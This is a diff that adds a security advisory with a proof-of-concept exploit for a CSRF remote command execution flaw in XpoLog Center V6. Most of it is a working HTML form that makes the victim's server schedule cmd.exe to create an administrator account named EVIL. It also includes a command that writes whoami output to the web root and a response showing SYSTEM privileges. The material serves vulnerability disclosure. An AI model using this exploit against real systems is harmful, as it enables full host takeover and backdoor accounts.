@@ -1,0 +1,98 @@
+﻿
+XpoLog Center V6 CSRF Remote Command Execution
+
+
+Vendor: XpoLog LTD
+Product web page: http://www.xpolog.com
+Affected version: 6.4469
+                  6.4254
+                  6.4252
+                  6.4250
+                  6.4237
+                  6.4235
+                  5.4018
+
+Summary: Applications Log Analysis and Management Platform.
+
+Desc: XpoLog suffers from arbitrary command execution. Attackers
+can exploit this issue using the task tool feature and adding a
+command with respected arguments to given binary for execution.
+In combination with the CSRF an attacker can execute system commands
+with SYSTEM privileges.
+
+Tested on: Apache-Coyote/1.1
+           Microsoft Windows Server 2012
+           Microsoft Windows 7 Professional SP1 EN 64bit
+           Java/1.7.0_45
+           Java/1.8.0.91
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5335
+Advisory URL: http://zeroscience.mk/en/vulnerabilities/ZSL-2016-5335.php
+
+
+14.06.2016
+
+--
+
+
+exePath = "C:\\windows\\system32\\cmd.exe"
+exeArgs = "/C net user EVIL pass123 /add & net localgroup Administrators EVIL /add"
+
+<html>
+  <body>
+    <form action="http://10.0.0.17:30303/logeye/tasks/xpotaskDefinitionAction.jsp?" method="POST">
+      <input type="hidden" name="" value="" />
+      <input type="hidden" name="csrfToken" value="NoToken" />
+      <input type="hidden" name="taskId" value="1465930398522" />
+      <input type="hidden" name="taskType" value="exe" />
+      <input type="hidden" name="name" value="CCMMDD" />
+      <input type="hidden" name="description" value="ZSL" />
+      <input type="hidden" name="IsSsh" value="false" />
+      <input type="hidden" name="exePath" value=""c&#58;&#92;&#92;windows&#92;&#92;system32&#92;&#92;cmd&#46;exe"" />
+      <input type="hidden" name="exeArgs" value=""&#47;C&#32;net&#32;user&#32;EVIL&#32;pass123&#32;&#47;add&#32;&&#32;net&#32;localgroup&#32;Administrators&#32;EVIL&#32;&#47;add"" />
+      <input type="hidden" name="exeEnvVar" value="" />
+      <input type="hidden" name="exeWorkDir" value="" />
+      <input type="hidden" name="exeOutputTargetFile" value="" />
+      <input type="hidden" name="NameXpoTaskSched" value="taskId&#95;1465930366962" />
+      <input type="hidden" name="IdXpoTaskSched" value="taskId&#95;1465930366962" />
+      <input type="hidden" name="actionIdXpoTaskSched" value="0" />
+      <input type="hidden" name="StateXpoTaskSched" value="1" />
+      <input type="hidden" name="schedulerSuffix" value="XpoTaskSched" />
+      <input type="hidden" name="trigTypeXpoTaskSched" value="cron" />
+      <input type="hidden" name="minutesXpoTaskSched" value="0" />
+      <input type="hidden" name="minutesEndXpoTaskSched" value="0" />
+      <input type="hidden" name="numOfExecutionsXpoTaskSched" value="0" />
+      <input type="hidden" name="frequencyXpoTaskSched" value="daily" />
+      <input type="hidden" name="DayInMonthXpoTaskSched" value="all" />
+      <input type="hidden" name="dailyTypeXpoTaskSched" value="repeat" />
+      <input type="hidden" name="dailyRepeatValueXpoTaskSched" value="1" />
+      <input type="hidden" name="dailyRepeatTypeXpoTaskSched" value="second" />
+      <input type="hidden" name="hoursXpoTaskSched" value="0" />
+      <input type="hidden" name="hoursEndXpoTaskSched" value="0" />
+      <input type="hidden" name="hoursOnce0XpoTaskSched" value="&#45;1" />
+      <input type="hidden" name="minutesOnce0XpoTaskSched" value="&#45;1" />
+      <input type="hidden" name="secondsOnce0XpoTaskSched" value="&#45;1" />
+      <input type="hidden" name="jobPriority" value="&#45;1" />
+      <input type="hidden" name="ajaxTimestamp" value="1465930905166" />
+      <input type="submit" value="Submit" />
+    </form>
+  </body>
+</html>
+
+--
+
+exePath = "C:\\windows\\system32\\cmd.exe"
+exeArgs = "/C whoami > c:\\Progra~1\\XpoLogCenter6\\defaultroot\\logeye\\testingus.txt"
+
+
+GET
+http://10.0.0.17:30303/logeye/testingus.txt
+
+Response:
+
+nt authority\system
